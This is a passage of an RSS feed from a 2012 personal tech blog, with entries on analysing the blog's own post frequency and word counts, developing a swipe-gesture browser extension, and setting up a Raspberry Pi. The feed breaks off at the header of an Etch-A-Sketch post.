&lt;p&gt;Those changes are hardly precipitous (however much anyone wants to unveil something in one flash of an instant in order to feign the appearance that everything happened suddenly and approached new heights of grandeur, that never actually happens, and it’s simply harder to work in that sort of manner - slow and steady doesn’t always lose the race). The first part was the change of the web host itself which was actually not exactly planned (I was testing out it, and unexpectedly on a whim cancelled my old web host and migrated over over the course of an afternoon and left the site down for a few hours). The second front at which this evolution occurred was a slight redesign, changing the color scheme a bit, upgrading the theme, reorganizing the categories and menus (this is meant to be chronicled in detail in some other blog post which I have yet to written). And the third and last one (which was meant to be the topic of this blog post) is a change in content.&lt;/p&gt;
&lt;p&gt;In summary, three inevitable changes on three different fronts. Content, Frontend, and Backend. All in a not-so-grand gesture to save this blog from decaying into a moldy blob of feces on the internet’s great sidewalk.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Meta Analytics</title>
      <link>http://antimatter15.com/2012/08/meta-analytics/</link>
      <pubDate>Fri, 17  Aug 2012 04:08:30 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/meta-analytics/</guid>
      <author></author>
      <description>&lt;p&gt;I’ve been maintaining this blog, or at least the content inside it for about five years now. It’s been through a handful of incarnations, often paired with significant changes in web hosting. I’ve had a blog for a little bit longer, but I don’t think I have the medium figured out. The structure of the posts and the style has changed over the past few years, but I can’t at this point call it evolution, a positive progression. Part of the power which lies in analyzing data is the ability to realize patterns, often at a different scale from human observation (spans of months or years) which are equally if not more insightful.&lt;/p&gt;
&lt;p&gt;That’s been my personal attraction to data science. I’ve had a couple of personal experiments involving collecting data about my daily activities, my old writing and code in hopes of distilling the changes that I’m too conceited to admit without the infallible hand of statistics. For nearly two years now, I’ve logged my entire life within precision of approximately 30 minutes from Google Calendar (or the Calendar app on iPad which syncs to Google Calendar). Actually, the label is slightly off, I quite often dedicate large spans of time to more or less useless labels like “not productive”. But this temporal information falls apart in terms of its richness, for my schedule is dictated more so by the mandatory rhythms of school life than the drifting cadence of other behavior.&lt;/p&gt;
&lt;p&gt;But I digress. This isn’t about why I collect data so much as “I have this data, now what?”. In this case, I had a hypothesis, a rather simple albeit morbid one at that “my blog is dying”. It’s not hard to see how I’m coming at the conclusion. I’m pretty much struggling at this point to meet my goal of one post per month (itself not a particularly difficult goal, but as time has gone on and my posts have become more infrequent, I feel more compelled to write obscenely long posts to compensate, but of course this also leads to big posts sitting there unfinished for long durations losing the sort of one post = one sitting mentality). But before I ramble for too long, I’ll cut to the chase and answer the question posed at the beginning of this paragraph: “Graphs.” (you could imagine those haunting glyphs levitating in the midst of air caught in the invisible grasp of Giorgio A. Tsoukalos, or better yet, I can spare your cognitive abilities by &lt;a href=&quot;http://qkme.me/3qj5f6&quot;&gt;making it real&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2012/Meta%20Analytics/blog-post-frequency.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Meta%20Analytics/blog-post-frequency.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;blog-post-frequency&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here’s a pretty little graph I made in R (sorry for the mess on the horizontal axis, and I just realized I have no idea as to how to interpret the dates, I’m assuming that they’re linear and it’s just some odd aliasing issue that makes even-numbered years repeat twice), it’s a histogram of the dates of posts that I’ve made to this blog (extracted with a simple Python script and Wordpress’s built-in Export button).You can probably actually tell that the blog’s demise is quite a long way’s coming. Every annual peak ends up shallower the following year and the first time &lt;em&gt;gaps&lt;/em&gt; have actually existed was this fateful year, 2012.&lt;/p&gt;
&lt;p&gt;It’s actually sort of interesting that these peaks exist, but I can’t really tell during what months that happened during (since these axes are labeled so terribly, it’d be nice if I knew some nice interactive graph engine that worked with histograms, something like that cool time series viewer that Google had for Finance for like ever but for histograms, but I guess that just shows how much of a non-scientist I am, to have no idea how to fluently articulate in a statistical or graphical language of my choice).&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2012/Meta%20Analytics/Word-Count-Plot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Meta%20Analytics/Word-Count-Plot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Word Count Plot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For more graph fun, here’s a scatter plot of word lengths as a function of year. I wasn’t dedicated enough to figure out how to get &lt;a href=&quot;http://nltk.org/&quot;&gt;NLTK&lt;/a&gt; to tell me the &lt;a href=&quot;http://en.wikipedia.org/wiki/Gunning_fog_index&quot;&gt;Gunning-Fog&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/Flesch%E2%80%93Kincaid_readability_test&quot;&gt;Flesch-Kincaid&lt;/a&gt; or &lt;a href=&quot;http://en.wikipedia.org/wiki/Automated_Readability_Index&quot;&gt;ARI&lt;/a&gt; value for individual posts, and I doubt that would end up showing anything particularly insightful. But yeah, so here it is. Charts. Charts of words. Note that thing that sticks out clocking in at around 3724 words is my first &lt;a href=&quot;http://antimatter15.com/wp/2011/05/uploading-mp3s-to-google-music-beta-from-linux-chrome-os-win-and-mac/&quot;&gt;Music Alpha&lt;/a&gt; post.&lt;/p&gt;
&lt;p&gt;Actually, I won’t mind that Wordpress isn’t yet self aware (‘ello Skynet) and still sends trackbacks and pings (whatever they are) to me when I link to myself. Seriously, you &lt;em&gt;don’t actually need to have a self-aware artificial intelligence in order to learn how to not spam me with emails when I’m quite probably as in super definitely aware of its existence&lt;/em&gt;. But anyway, I guess I’ll stomach the lurching pain of a thousand emails (I’m using hyperbole here, in case your rudimentary artificial intelligence algorithms can’t quite distinguish them, but I’m also pretty sure your algorithms wouldn’t be able to handle n-th degrees of meta, so this excruciatingly useless parenthetical wouldn’t be much other than that: excruciatingly useless) and post the last part of the list here.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='vhdl'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;1340133957.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;19&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;25&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;57&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;1178&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/pinball/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/pinball/)

&lt;span class=&quot;hljs-number&quot;&gt;1333025085.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;03&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;44&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;45&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;1302&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;03&lt;/span&gt;/musicalpha-v2-&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;03&lt;/span&gt;/musicalpha-v2-&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;/)

&lt;span class=&quot;hljs-number&quot;&gt;1293394934.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2010&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;14&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;1409&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2010&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;/drag2up-v2-drag-&lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt;-drop-uploading-&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;-&lt;span class=&quot;hljs-keyword&quot;&gt;all&lt;/span&gt;-sites/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2010&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;/drag2up-v2-drag-&lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt;-drop-uploading-&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;-&lt;span class=&quot;hljs-keyword&quot;&gt;all&lt;/span&gt;-sites/)

&lt;span class=&quot;hljs-number&quot;&gt;1317686582.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;03&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;02&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;1565&lt;/span&gt; [Haven&lt;span class=&quot;hljs-attribute&quot;&gt;'t&lt;/span&gt; actually published this yet, hmm]

&lt;span class=&quot;hljs-number&quot;&gt;1341591648.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;16&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;48&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2117&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;/cloudfall-a-text-editor/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2012&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;/cloudfall-a-text-editor/)

&lt;span class=&quot;hljs-number&quot;&gt;1307064165.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;01&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;45&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2180&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/why-the-chrome-web-store-&lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt;-bad-&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;-the-web/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/why-the-chrome-web-store-&lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt;-bad-&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;-the-web/)

&lt;span class=&quot;hljs-number&quot;&gt;1277922545.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2010&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;29&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2319&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2010&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/wave-embed-api/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2010&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/wave-embed-api/)

&lt;span class=&quot;hljs-number&quot;&gt;1294958307.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;01&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;38&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;27&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2762&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;01&lt;/span&gt;/the-ambiguity-&lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt;-&lt;span class=&quot;hljs-keyword&quot;&gt;open&lt;/span&gt;-&lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt;-vp8-vs-h-&lt;span class=&quot;hljs-number&quot;&gt;264&lt;/span&gt;/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;01&lt;/span&gt;/the-ambiguity-&lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt;-&lt;span class=&quot;hljs-keyword&quot;&gt;open&lt;/span&gt;-&lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt;-vp8-vs-h-&lt;span class=&quot;hljs-number&quot;&gt;264&lt;/span&gt;/)

&lt;span class=&quot;hljs-number&quot;&gt;1308832860.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;41&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2872&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/samsung-series-&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;-chromebook/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;/samsung-series-&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;-chromebook/)

&lt;span class=&quot;hljs-number&quot;&gt;1305426252.0&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt;-&lt;span class=&quot;hljs-number&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;02&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt; , &lt;span class=&quot;hljs-number&quot;&gt;3724&lt;/span&gt; [http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt;/uploading-mp3s-&lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt;-google-music-beta-from-linux-chrome-os-win-&lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt;-mac/](http://antimatter15.com/wp/&lt;span class=&quot;hljs-number&quot;&gt;2011&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt;/uploading-mp3s-&lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt;-google-music-beta-from-linux-chrome-os-win-&lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt;-mac/)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That list was compiled by the command &lt;code&gt;cat blogtimes.csv | sort -t&amp;#39;,&amp;#39; -k3n | tail&lt;/code&gt;, and that’s quite an accomplishment because I had to look up the arguments for the &lt;code&gt;sort&lt;/code&gt; command in order to figure that out. Of course, &lt;code&gt;blogtimes.csv&lt;/code&gt; is the output of my magical six line python script (which uses BeautifulSoup to extract all the &lt;code&gt;wp:post_date&lt;/code&gt;s).&lt;/p&gt;
&lt;p&gt;So, with 10 blog posts in that list, every single 8 of them happened after 2011 and 3 of them happened in 2012. Considering that there were 10 things published in 2012 (according to my dataset) and 21 in 2011, that’s a rather significant fraction of the stuff which has been written recently to be insanely long.&lt;/p&gt;
&lt;p&gt;Wordpress tells me this post is now at 948 words, so I guess I’ll add a bit of concluding at the end to push it over the magical power-of-ten barrier, so presumably you should brace for the terrible boom which occurs at this point (oh, what’s that? I think that’s my imaginary telephone operator who informs me when I make a factual error, apparently those kinds of booms only happen with waves, and apparently words flowing through word count orders of magnitude don’t count).&lt;/p&gt;
&lt;p&gt;The original title of this post was “Meta Analytics &amp;amp; Upcoming Changes”, but in the spirit of the upcoming changes, I’ve moved the “Upcoming Changes” part into its own post (tentatively titled “Upcoming Changes”). You can probably at this point guess that “Upcoming Changes” involves something to tackle the excessive verbosity and to mitigate the absurdly infrequent posts. This probably doesn’t sound nearly as heroic to you as it does to me, because I’m listening to The Avengers soundtrack right now, and “A Promise” is pretty dramatic.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Swipe Gesture 2 Development</title>
      <link>http://antimatter15.com/2012/08/swipe-gesture-2-development/</link>
      <pubDate>Thu, 16  Aug 2012 04:26:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/swipe-gesture-2-development/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Swipe%20Gesture%202%20Development/4WsjX.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Swipe%20Gesture%202%20Development/4WsjX.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;4WsjX&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So I’m trying something new, returning to quasi-daily somewhat short updates about the development of whatever I’m working on rather than withholding everything until something of somewhat acceptable release quality is achieved. I have a blog post about that transition, but I’m still working on it (as in, writing it is somewhat boring). It’s probably better given my development cycle is quite nonlinear, usually I get something somewhat promising made in the first few days or so and pause for long and possibly indefinite durations doing other stuff in the process. Probably, writing short blog posts about what I have yet to finish will remind me to, well, finish them. Just maybe. But I’m probably going to have to preface every post that I write with this kind of disclaimer until I actually get that post finished and published so I have something to reference rather than pointing crazily into the air and saying “oh yeah, it’s coming, now, someday, maybe.”.&lt;/p&gt;
&lt;p&gt;Starting about yesterday, I started working on the successor to Swipe Gesture. The new version tries to mimic the actual behavior of Chrome on Lion, which I think is really quite cool. Here’s a &lt;a href=&quot;http://www.youtube.com/watch?v=H-LY6-UdtO8&quot;&gt;video I found on YouTube&lt;/a&gt; which shows how it basically looks like if you aren’t familiar with it. The first thing to notice that it’s substantially less trivial, code-wise. No more is it a 30-line software lightweight, but it’s not _too _complex and arcane to forbid any kind of comprehension. Now, the simple prototype of its functionality is already nearing 300 lines of code.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2012/Swipe%20Gesture%202%20Development/Screenshot-from-2012-08-14-111944.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Swipe%20Gesture%202%20Development/Screenshot-from-2012-08-14-111944-150x150.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot from 2012-08-14 11:19:44&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Another big difference is now it’s no longer designed strictly for Chromebooks. In fact, one of the reasons for starting this was that I was informed that the kind of functionality might be useful on Macbooks running Windows via Bootcamp. In fact, it’s meant to be as general as possible, to work on pretty much any kind of platform. And it’s not even bound strictly to the horizontal axis: the code is meant to work with linear swipes in any direction including diagonally (although some experimentation on my chromebook seems to indicate that swiping at angles isn’t terribly useful).&lt;/p&gt;
&lt;p&gt;The most significant conceptual change is the transition between a speed/acceleration metric to a distance metric. That is, in the old version, an action was triggered when there was a swipe in one direction vigorous enough to be considered. This was a fairly simple way to avoid the problem of distinguishing between a horizontal scroll action and a swipe by not making a distinction. In a sense, cheating. The new version instead does things “the right way™” by observing events carefully to determine if a swiping action actually results in scrolling. If that’s your kind of thing, the technical nitty gritty details have their own &lt;a href=&quot;http://antimatter15.com/wp/2012/08/determining-if-a-mousewheel-event-results-in-scroll/&quot;&gt;dedicated blog post&lt;/a&gt;, so feel free to click through if you’re interested.&lt;/p&gt;
&lt;p&gt;Once it’s determined that that scroll thing is actually probably a swipe gesture, it renders a nice little arrow in canvas. I considered using a unicode arrow and setting the font to huge, but that didn’t turn out quite as well as I expected (plus, it makes rotations and interactions with the embedding page CSS a little less predictable).&lt;/p&gt;
&lt;p&gt;Also another thing is that it turns out that it’s a bad idea to set a css transition on something which is meant to hook with mouse or scroll movements because, while this ends up smoothing things out (which is good for mouse wheels because they click to the nearest 120 magical click units) it ends up producing a significant amount of lag and just feels so awkward.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2012/Swipe%20Gesture%202%20Development/Swipe2.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Swipe%20Gesture%202%20Development/Swipe2-150x150.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Swipe2&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Another thing (since this post is written over the course of several days, and the actual update has already been published at time of writing) is the cool redesign of the Settings page. The first thing to notice is that the settings page for once actually has settings, which is quite an accomplishment by itself. Also, it has a visual refresh that makes it look somewhat bootstrap-esque. That’s because ever since using Bootstrap in the making of Protobowl (a rather big project that I have yet to blog about), I’ve pretty much fallen in love with the color &lt;code&gt;whiteSmoke&lt;/code&gt;. Partly because it has a name, which means I don’t have to google it or tattoo it on my arm for a mnemonic’s sake, and also because it’s a pretty nice color.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Raspberry Pi</title>
      <link>http://antimatter15.com/2012/08/raspberry-pi/</link>
      <pubDate>Tue, 14  Aug 2012 07:00:26 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/raspberry-pi/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Raspberry%20Pi/Raspi_Colour_R.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Raspberry%20Pi/Raspi_Colour_R-248x300.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Raspi_Colour_R&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;As part of the shift between long multi-kiloword blog posts which are somewhat more like press releases back into a sort of more personal (i.e. blog-esque) format, I guess I’ll talk about my newly-arrived &lt;a href=&quot;http://en.wikipedia.org/wiki/Raspberry_Pi&quot;&gt;Raspberry Pi&lt;/a&gt;. Right now, there isn’t terribly much to talk about since I’ve only had it for about two weeks.&lt;/p&gt;
&lt;p&gt;I’ve been planning on getting a Raspberry Pi for a pretty long time, and I was actually pretty excited about that. For the weeks preceding the official announcement, I built a tiny script which ran in a ten-minutely cron job which would basically download the purported Raspberry Pi store (raspberrypi.com, note the dot-com rather than dot-org, which their homepage is situated at) and compare the hash, notifying me via Ubuntu’s built in notification system.&lt;/p&gt;
&lt;p&gt;On that sleepless night when the actual pre-sale announcement was being made, I was incessantly checking &lt;a href=&quot;http://raspberrypi.com&quot;&gt;raspberrypi.com&lt;/a&gt;, which had suddenly morphed into a server maintenance message (which remains to this very day). The anticipation was intense, and some twenty minutes after it was supposed to happen was when I realized that the whole time I had been checking the wrong page. The announcement came instead on &lt;a href=&quot;http://www.raspberrypi.org/&quot;&gt;raspberrypi.org&lt;/a&gt;, their main blog, and by that time, it was certain that all the distributor’s sites were already collapsing under the crushing load of a million souls crying out for a taste of berry-scented silicon pastry.&lt;/p&gt;
&lt;p&gt;On the next day, I checked the sites again, and all the order pages were already closed. Either way, it wasn’t terribly useful for me because most of them didn’t support Paypal. Fast forward a veritable eternity, on June 16th, I was notified via email that RS Components that I would be allowed to order the device some time&lt;a href=&quot;http://uk.rs-online.com/web/generalDisplay.html?id=raspberrypi&amp;amp;file=questions#Queue&quot;&gt; in the near future&lt;/a&gt;. Sure enough, on the 22nd, another email gave me a link to the order form, which I promptly filled out and I began the process of waiting. Not really, since I had other stuff to do and most of my interest had already vaporized at the daunting 7 weeks it was supposed to take.&lt;/p&gt;
&lt;p&gt;Another eternity later, it arrived in some rather nice packaging. It actually came as a bit of a surprise, because I had become so accustomed to waiting that I had never really expected it to materialize so suddenly. But when it did, it was everything I imagined and more. It came in this rather nice cardboard box, which I eventually cut in half with an X-Acto knife (which nowadays, I use for all my paper splicing needs) to build a makeshift case. I fumbled around in a closet and found a neglected 16GB SD card (probably back from the era when point-and-shoots were actually preferable to mobile phones) and installed that weird Debian distro (after having a little internal debate on what to install). But the first thing I had done was plugged it into a monitor through a HDMI-to-DVI converter. I took the charger from my Galaxy Nexus (I wasn’t using it for anything since I charge it in my room from my HP Touchpad Charger, and my Touchpad idly draining power from a cool inductive stand, the standardization of chargers is really pretty awesome), and used that as my Pi’s permanent power supply.&lt;/p&gt;
&lt;p&gt;I also had a 2000mAh LiPo battery which I was going to use with my Arduino LilyPad for some cool foot-operated telegraph which I wanted to use as essentially a UPS for the Pi, but a bit of googling reveals that that might possibly entail actual electronicswork, so maybe that’s something for later.&lt;/p&gt;
&lt;p&gt;I turned it on, and lo and behold it didn’t work. I actually never quite figured out why. Then, I tried plugging it into a really old 13 megaton CRT TV, which makes me realize how it’s sort of weird that the unit of megatons is hardly ever used for things other than atomic weapons, and now it feels oddly inappropriate for a hyperbole for the mass of a TV, but maybe it’s actually sort of appropriate because CRTs are &lt;em&gt;terrifying&lt;/em&gt;. So analog seemed to work, except for this problem where my keyboard would keep repeating letters and not working well. That wasn’t a good start.&lt;/p&gt;
&lt;p&gt;But after a little googling from my Chromebook, it turns out the keyboard issues came from the fact that I had plugged in my only spare USB keyboard which happened to be a Logitech Mouse+Keyboard+Speaker thing and my teensy Galaxy Nexus charger couldn’t eke out enough watts to power it. And the issue with the HDMI-to-DVI thing was just because I needed to restart with the cable plugged in. But neither of them posed a real material issue because I had been intending to use it as a headless rig from the start.&lt;/p&gt;
&lt;p&gt;The first thing I really noticed was how surprisingly easy it was to install things. I had expected the ARM repositories to basically lack everything which might be useful, but it turns out that actually almost everything I wanted was available. I didn’t dare compiling anything, but &lt;a href=&quot;http://nodejs.org/&quot;&gt;Node&lt;/a&gt; (albeit a somewhat old version) was available from the repos, so I never really needed to. I had to manually update to a new version of &lt;a href=&quot;https://npmjs.org/&quot;&gt;npm&lt;/a&gt;, but that wasn’t that bad. I set up &lt;a href=&quot;https://github.com/nodejitsu/forever/&quot;&gt;forever&lt;/a&gt; to run a few apps, but not much.&lt;/p&gt;
&lt;p&gt;One of the main reasons I could justify getting the Raspberry Pi however, was to run my &lt;a href=&quot;http://antimatter15.com/wp/2012/05/visualizing-facebook-activity/&quot;&gt;Facebook logging script&lt;/a&gt; on something other than my main computer, and aside from getting confused trying to use sendxmpp, it was fairly straightforward.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Etch-A-Sketch on a Trackpad</title>
      <link>http://antimatter15.com/2012/08/etch-a-sketch-on-a-trackpad/</link>
      <pubDate>Tue, 14  Aug 2012 02:47:13 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/etch-a-sketch-on-a-trackpad/</guid>
      <author></author>
